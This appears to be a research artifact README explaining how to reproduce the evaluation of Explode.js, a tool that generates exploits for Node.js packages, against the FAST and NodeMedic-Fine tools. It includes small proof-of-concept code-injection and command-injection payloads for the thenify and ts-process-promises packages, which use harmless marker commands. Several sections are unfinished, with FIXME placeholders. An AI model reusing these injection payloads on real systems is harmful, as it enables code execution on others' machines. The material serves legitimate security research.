# Automated Exploit Generation for Node.js Packages

This artifact evaluates Explode.js, a novel tool for synthesizing exploits for Node.js applications.
By combining static analysis and symbolic execution, Explode.js generates functional exploits that confirm the existence of command injection, code injection, prototype pollution, and path traversal vulnerabilities.
The repository includes all source code, reference datasets and instructions on how to build and run the experiments.
These experiments result in the tables presented in the paper, which can be used to validate the results.

# A. Getting Started

This section includes an introduction to the Explode.js tool, along with its requirements, setup instructions, and basic testing procedures for running the artifact.

## A.1. Description & Requirements

**How to access.**
The artifact is available as a persistent DOI at [10.5281/zenodo.15009157](10.5281/zenodo.15009157).

**Dependencies.**
The evaluation of this artifact does not depend on specific hardware. However, the following software and hardware specifications are recommended:

- Linux (tested with Ubuntu Ubuntu 24.04.2 LTS and Debian 10/11);
- Docker (tested with version 28.0.1);
- 32GiB RAM;
- Stable internet connection (Explode-js requires npm install to validate exploits).

**Source Code and Benchmarks.**
All source code and reference benchmarks are included in the repository and respective docker images.

**Time.**
We estimate that the time needed to run the artifact evaluation is as follows:
- Getting started: 30 minutes (approximately).
- Main experiments: XX hours (approximately).

**Artifact Structure.**
The artifact is organized as follows:

```
---------- [FIXME]

Explode.js
├── bench
│   ├── datasets                # Benchmarks to be evaluated
│   │   ├── secbench-dataset
│   │   ├── vulcan-dataset
│   │   ├── collected-dataset
│   │   └── test-dataset
│   ├── fast                    # Submodule with the FAST tool repository
│   ├── NodeMedic               # Submodule with the NodeMedic-Fine tool repository
│   └── plots                   # Scripts to run experiments and setup
├── example                     # Example programs for Explode.js
│   └── running-example         # Running example code
├── src                         # Source code of Explode.js
├── test                        # Unit tests of Explode.js
├── vendor                      # External dependencies of Explode.js
│ ...
├── Dockerfile
└── README.md
```

The artifact includes three Docker containers: `explode-js_image.tar.gz`, `fast_image.tar.gz`, and `nodemedic_image.tar.gz`. The first container corresponds to Explode.js, our tool, while the second and third correspond to FAST and NodeMedic-Fine, the main competing tools. Each tool's experiments should be executed with its designated Docker container.

## A.2. Getting Started with Explode.js

**Setup.**
To set up the environment, load the Explode.js Docker image, `explode-js_image.tar.gz`, using the following command in the root directory of the artifact:

```sh
$ docker load < explode-js_image.tar.gz
```

**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, run Explode.js on the running example using the following commands:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js/example
$ explode-js full running-example/index.js
```

**Output.** The output of the previous command should be:

```
[STEP 1] MDG: Generating...

[STEP 1] MDG: Completed.
[STEP 2] Queries: Importing the graph...
[INFO] Stop running Neo4j local instance.
[INFO] Import MDG to Neo4j.
[INFO] Starting Neo4j
[STEP 2] Queries: Imported
[STEP 3] Queries: Traversing Graph...
[INFO] Running injection query.
[INFO] Reconstructing attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Running prototype pollution query.
[INFO] Prototype Pollution - Reconstructing attacker-controlled data.
[INFO] Detected 1 vulnerabilities.
[STEP 3] Queries: Completed.
── PHASE 1: TEMPLATE GENERATION ──
✔ Loaded: _results/taint_summary.json
⚒ Generating 1 template(s):
├── 📄 ./symbolic_test_0.js

── PHASE 2: ANALYSIS & VALIDATION ──
◉ [1/1] Procesing ./symbolic_test_0.js
├── Symbolic execution output:
"Uncaught TypeError"
"Uncaught TypeError"
"File too big"
Exec failure: (str.++
               ((str.++
                 ((str.++
                   ((str.++ ((str.++ ("rsync -av /tmp/0 ", id)), "@")),
                   host)), ":")), dstDir))
├── Symbolic execution stats: clock: 30.812713s | solver: 30.421486s
├── ⚠ Detected 1 issue(s)!
│   ├── ↺ Replaying 2 test case(s)
│   │   ├── 📄 [1/2] Using test case: ./symbolic_test_0/test-suite/witness-0.json
│   │   │   ├── Node exited with 0
│   │   │   └── ✔ Status: Success (created file "./success")
```

The generated exploit can be found in the file `_results/run/symbolic_test_0/literal_1.js`.

## A.3. Getting Started with FAST

**Setup.**
To setup the environment, load the FAST Docker image `fast_image.tar.gz`, with the following command:

```sh
$ docker load < fast_image.tar.gz
```

Then, to create and start container from the loaded image one can use:
```sh
$ docker run -it -h fast fast
```

**Basic Testing.**
To ensure that the tool is running as expected, one can verify it by running FAST on the `thenify@3.3.0` package with the following command:

```sh
$ cd explode-js
$ python3 run-fast.py datasets out --packages thenify
```

**Output.** The output of the previous command should be:

```
[*] 1 package(s) selected for benchmarking
[-] Running: thenify@3.3.0
Running: python3 -m simurun -t code_exec -X datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js

| package  | version | cwe   | marker   | path_time | expl_time | total_time | detection  | exploit  |
|----------|---------|-------|----------|-----------|-----------|------------|------------|----------|
| thenify  | 3.3.0   | CWE-94| Exited 0 | 0.385258  | 26.0743   | 26.4596    | successful | failed   |
```
The output table is also saved in `.csv` format as `fast-parsed-results.csv`.

FAST does not generate exploits.
Instead, it generates a trace with information regarding the inputs to activate the exploit.
In this case, FAST generates the trace to stdout. Part of it is given below

```
Attack Path:
==========================
/home/explodejs/explode-js/datasets/vulcan-dataset/CWE-94/GHSA-29xr-v42j-r956/src/index.js

Line 28:
--------------------------------------------------
thenify.withCallback = function ($$__fn__$$, options) {
    assert(typeof $$__fn__$$ === 'function')
    options = options || {}
    options.withCallback = true
    if (options.multiArgs === undefined) options.multiArgs = true
    return eval(createWrapper($$__fn__$$.name, options))
}

Line 60:
--------------------------------------------------
multiArgs = 'var multiArgs = ' + JSON.stringify(multiArgs) + '\n'

Line 67:
--------------------------------------------------
return '(function ' + name + '() {\n'
    + 'var self = this\n'
    + 'var len = arguments.length\n'
    + multiArgs
    + withCallback
    + 'var args = new Array(len + 1)\n'
    + 'for (var i = 0; i < len; ++i) args[i] = arguments[i]\n'
    + 'var lastIndex = i\n'
    + 'return new Promise(function (resolve, reject) {\n'
        + 'args[lastIndex] = createCallback(resolve, reject, multiArgs)\n'
        + '$$__fn__$$.apply(self, args)\n'
    + '})\n'
+ '})'

Line 17:
--------------------------------------------------
return eval(createWrapper($$__fn__$$.name, options))
```
The full trace can be found in the saved stdout file: `out/5_fast/fast-stdout.log`. One can manually construct the exploit for the above example:

```js
var thenify = require("thenify");
var $$__fn__$$ = {
    name: "() {} && console.log('success') && some"
}
var options = {};
thenify.withCallback($$__fn__$$, options);
```

## A.4. Getting Started with *NodeMedic-Fine*

**Setup.**
To setup the environment, load the NodeMedic-Fine Docker image `nodemedic_image.tar.gz`, with the following command:

```sh
$ docker load < nodemedic_image.tar.gz
```

This script will build NodeMedic's official Docker image and install two Python modules necessary for generating the output.

```sh
$ python3 -m pip install pandas~=2.2.3 tabulate~=0.9.0
```

**Basic Testing.**
To verify that the image is properly loaded and that the tool is running as expected, run NodeMedic for the `ts-process-promises@1.0.2` example using the following command:

```sh
$ python3 run-NodeMedic.py bench/datasets out --packages ts-process-promises
```

**Output.** The output of the previous command should be:

```
[*] 1 package(s) selected for benchmarking
[-] Running: ts-process-promises@1.0.2
Running: docker run -it --rm -v /Users/framos/Desktop/explode-js/out/ts-process-promises@1.0.2__nodeMedic:/nodetaint/analysisArtifacts:rw nodemedic-fine:latest --package=ts-process-promises --version=1.0.2 --mode=full

| package             | version   | cwe    | marker   |   fuzz_time |   expl_time |   total_time | taintpath   | exploit   |
|:--------------------|:----------|:-------|:---------|------------:|------------:|-------------:|:------------|:----------|
| ts-process-promises | 1.0.2     | CWE-78 | Exited 0 |      20.097 |      10.628 |      72.4447 | true        | true      |
```

One of the generated exploits can be found in the file `out/ts-process-promises@1.0.2__nodeMedic/poc0.js`:

```js
// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};

var PUT = require('/nodetaint/packageData/ts-process-promises/node_modules/ts-process-promises');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = {};
new PUT["exec"](x0,x1)();
} catch (e) {
	console.log(e);
}
```

# B. Main Experiments

With this artifact, our goal is to demonstrate the following claims of the paper, each corresponding to one of its main research questions:

- **Claim 1** *(RQ1 - Section 6.1): Effectiveness in Exploit Generation.*
Explode.js is more effective in generating exploits than its main competitor tools.

- **Claim 2** *(RQ2 - Section 6.2): Exploit Generation in the Wild.*
Explode.js is able to find new exploits for real-wold Node.js modules in the wild.

- **Claim 3** *(RQ3 - Section 6.3): Performance Evaluation.*
Explode.js is able to generate exploits in feasible time, but is less performant than its main competitor tools.

- **Claim 4** *(RQ4 - Section 6.4): Necessity of Explode.js Components.*
The core techniques of Explode.js (VISes and lazy values) are key to its effectiveness.

This section contains instructions to reproduce the experiments that support the claims of the paper.
These experiments result in the tables and plots presented in the paper, which can be used to validate the results.

**Timeouts.** The analysis of each package has a pre-defined timeout of 10 minutes.
This parameter can affect the results produced, since different machines may experience a different number of timeouts.
Consequently, there can be slight variations in the results, but all claims are expected to verified.

**Paper Discrepancies.** FIXME

## B.1. Claims 1 and 3

The goal of this section is to confirm the results presented in Sections 6.1 and 6.2 of the paper;
specifically those of Tables 3 and 6, which we reproduce below:

**Table 3. [Effectiveness]**

| CWE ID   |  Total |  TP (Explode-js) |   E (Explode-js) | TP (FAST) | E (FAST) | TP (NodeMedic) | E (NodeMedic) |
|----------|--------|-----|-----|----|----|----|----|
| CWE-22   |    166 |  97 |  84 | 6 | 0 | -- | -- |
| CWE-78   |    169 | 111 |  70 | 106 | 66 | 51 | 49 |
| CWE-94   |     54 |  24 |  11 | 7 | 3 | 17 | 5 |
| CWE-1321 |    214 | 108 |  98 | 0 | 0 | -- | -- |
| Total    |    603 | 340 | 263 | 119 | 69 | 68 | 44 |

**Table 6. [Performance]**

| CWE ID   | Static | Symbolic |  Total |
|----------|--------|----------|--------|
| CWE-22   | 29.106 |    2.462 | 31.568 |
| CWE-78   | 33.976 |    6.545 | 40.521 |
| CWE-94   | 42.947 |   11.926 | 54.873 |
| CWE-1321 | 31.162 |   10.949 | 42.112 |
| Total    |  32.45 |    7.278 | 39.728 |

To reproduce the results of the tables above, one must first run Explode.js, FAST, and NodeMedic-Fine in the Vulcan and SecBench.js datasets.
We have to do this separately for each tool.

### B.1.1. Explode.js

Load the Explode.js docker image as explained in section **A.2** and run the following commands:

```sh
$ cd explode-js
$ ./run_explode-js.sh
```

This will take approximately **10 hours**.
To determine if the execution was successful, a table summarizing the results should be printed to the stdout at the end.

The generated exploits are stored in the output dirs in `bench/datasets/CWE-{22|78|94|1321}`
To check the exploit generated for a specific package, say the `deep-get-set@1.1.1` (id 93) package, see file `bench/datasets/CWE-1321/93/run/symbolic_test_4/literal_1.js`.

To generate the Explode.js results of Table 3, run:

```sh
$ python3 table_explode-js.py
```

To generate the Explode.js results of Table 6, run:

```sh
$ python3 table_explode-js_time.py
```

### B.1.2. FAST

Load the FAST docker image as explained in section **A.3** and run the following commands:

```sh
$ cd explode-js
$ python3 run-fast.py datasets/ out
```

This will take approximately `[FIXME]` hours.
To determine if the execution was successful, a table summarizing the results should be printed to the stdout at the end.

As stated before, FAST does not generate executable exploits; those have to be manually put together from the output trace information.
We have done that for all the generated traces in the dataset, which can be consulted in the folder `bench/datasets/fast-pocs`.
To check the exploit generated for a specific package, say the `xopen@1.0.0` package, see file `bench/datasets/fast-pocs/xopen/poc.js`.

To generate the FAST column results of Table 3, run:

```sh
$ python3 table_fast.py
```

To generate the FAST results of Table 6, run in the folder `[FIXME]`:

```sh
$ python3 table_fast_time.py
```

### B.1.3. NodeMedic-Fine

Run the following command in the root of the artifact:

```sh
$ python3 run-NodeMedic.py bench/datasets out
```

This will take approximately `[FIXME]` hours.
To determine if the execution was successful, check if `[FIXME]`.

The generated exploits are stored `[FIXME]`.
To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.

To generate the NodeMedic-Fine results of Table 3, run:

```sh
$ python3 table_nodemedic.py
```

To generate the NodeMedic-Fine results of Table 6, run:

```sh
$ python3 table_nodemedic_time.py
```

### B.1.4. Speed-up the Analysis

For the sake of time, instead of confirming the results for the entire dataset, the reviewers can confirm the results for just one specific type of vulnerability.
To this end, we it suffices to provide a flag indicating that vulnerability to the analysis script.
For instance, if we wanted to confirm the results of Explode.js for just path-traversal run the command:

```sh
$ ./run_explode-js_cwe22.sh  # takes ~1.7h
# Others CWEs:
$ ./run_explode-js_cwe78.sh  # takes ~2.5h
$ ./run_explode-js_cwe94.sh  # takes ~1h
$ ./run_explode-js_cwe1321.sh  # takes ~5h
```

**FAST**: Fast includes a similar mechanism with:

```sh
$ python3 run-fast.py datasets/ out --cwes CWE-22
$ python3 run-fast.py datasets/ out --cwes CWE-78
$ python3 run-fast.py datasets/ out --cwes CWE-94
$ python3 run-fast.py datasets/ out --cwes CWE-1321
```

**NodeMedic-Fine**:

```sh
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-22
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-78
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-94
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-1321
```

## Claim 2

The goal of this section is to confirm the results presented in Section 6.2 of the paper;
specifically those of Table 5, which we reproduce below:

**Table 5. [Explode.js in the Wild]**

`[TODO]`

To reproduce the results of the table above, we provide the set of packages for which Explode.js found
new vulnerabilities in `[FIXME]` and a script to run Explode.js on these packages.
To run Explode.js on the wild packages in which new vulnerabilities were found, load the
Explode.js docker image and run:

```sh
$ cd explode-js
$ ./run_explode-js_zeroday.sh
```

The scripts output a version of the table above and the generated exploits can be found in the `FIXME` folder.
To check the exploit generated for a specific package, say the `[FIXME]` package, see file `[FIXME]`.

To generate Table 5, run:

```sh
$ python3 table_explode-js_zeroday.py
```

A table summarizing the results should be printed to the stdout.

## Claim 4

The goal of this section is to confirm the results presented in Section 6.4 of the paper;
specifically those of Table 7, which we reproduce below:

**Table 7. [Explode.js Components]**

**No lazy values**

| CWE ID   |  TP |   E |  Total Vulns |
|----------|-----|-----|--------|
| CWE-22   |   3 |   1 |    166 |
| CWE-78   |  57 |  46 |    169 |
| CWE-94   |  17 |  10 |     54 |
| CWE-1321 |  41 |  33 |    214 |
| Total    | 118 |  90 |    603 |

**No VIS**

| CWE ID   |  TP |   E |  Total Vulns |
|----------|-----|-----|--------|
| CWE-22   |   0 |   0 |    166 |
| CWE-78   |  60 |  44 |    169 |
| CWE-94   |   8 |   1 |     54 |
| CWE-1321 |  18 |   5 |    214 |
| Total    |  86 |  50 |    603 |

To reproduce the results of the table above, one must first run Explode.js without VISes and Lazy Values.

To execute Explode.js without VISes, load the Explode.js docker image and run:

```sh
$ cd explode-js
$ ./run_explode-js_no-vis.sh
```

This will take approximately **2 hours**.
To determine if the execution was successful, a table summarizing the results should be printed at the end.

To execute Explode.js without Lazy Values, load the Explode.js docker image and run:

```sh
$ cd explode-js
$ ./run_explode-js_no-lazy-values.sh
```

This will take approximately **8 hours**:
To determine if the execution was successful, a table summarizing the results should be printed at the end.

Both tables used to generate the results presented in Table 7 should be visable after the execution of the previous commands. However, to generate the results after running the previous commands, one must simply run:

```sh
# For the No Lazy Values columns
$ python3 table_explode-js2.py ./bench/datasets/no-lazy-values/results.csv
# For the No VIS columns
$ python3 table_explode-js2.py ./bench/datasets/no-vis/results.csv
```
